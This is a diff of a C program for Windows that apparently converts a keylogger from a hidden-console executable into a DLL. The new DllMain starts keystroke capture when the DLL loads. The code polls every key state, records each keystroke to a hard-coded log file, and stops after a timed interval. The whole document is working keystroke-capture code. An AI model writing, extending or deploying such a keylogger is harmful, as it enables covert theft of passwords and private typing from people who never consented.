@@ -4,18 +4,37 @@
 #include <string.h>
 
 
+int EntryPoint();
 void writeLog(char *c, char *fileName);
 char *getKey(unsigned char c);
 
-int main() {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    char logFileName[] = "log.txt";
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
+        case DLL_PROCESS_ATTACH:
+            EntryPoint();
+            break;
+    }
+    return TRUE;
+}
+
+int EntryPoint() {
+    char logFileName[] = "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt";
     unsigned char keyboardState[256] = {0};
     unsigned short buffer[2];
     HKL keyboardLayout = GetKeyboardLayout(0);
 
+    //Time Funtions
+    // 4297 = 1 min
+    int TIM = 0;
+
     while (1) {
         Sleep(10);
+        TIM++;
+
+        if (TIM==128910)
+        {
+            return 0;
+        }
         
         for (unsigned short k = 0; k < 256; k++) {
             if ((GetKeyState(k) & 0x8000) && !(k == VK_LCONTROL || k == VK_RCONTROL || k == VK_CONTROL || k == VK_MENU)) 
@@ -38,12 +57,15 @@ int main() {
                     else 
                         sprintf(str, "[%d]", (unsigned short)k);
                 }
-                log(str, logFileName);
+                writeLog(str, logFileName);
             }
         }
+
     }
     return 0;
 }
+
+
 
 void writeLog(char *c, char *fileName) {
     FILE *logFile;
@@ -185,3 +207,4 @@ char *getKey(unsigned char c) {
     }
     return str;
 }
+
